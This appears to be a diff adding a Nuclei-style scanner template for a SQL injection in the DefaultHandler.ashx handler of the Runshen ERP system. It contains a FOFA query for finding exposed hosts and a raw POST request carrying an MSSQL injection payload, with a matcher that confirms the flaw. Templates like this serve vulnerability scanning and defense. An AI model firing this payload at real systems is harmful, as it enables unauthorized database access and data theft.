@@ -1,0 +1,28 @@
+id: runshen-erp-defaulthandler-sql
+
+info:
+  name: "润申信息科技ERP系统DefaultHandler.ashx处理程序SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="PDCA/js/_publicCom.js"
+      该漏洞源于润申信息科技ERP系统中DefaultHandler.ashx处理程序未正确过滤用户输入参数，攻击者可通过构造恶意SQL语句实现数据库查询操控，可能导致敏感数据泄露或业务逻辑篡改。
+  tags: 润申信息科技
+
+http:
+- raw:
+  - |
+    POST /ashx/DefaultHandler.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1')),3,32))<0--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a0b'
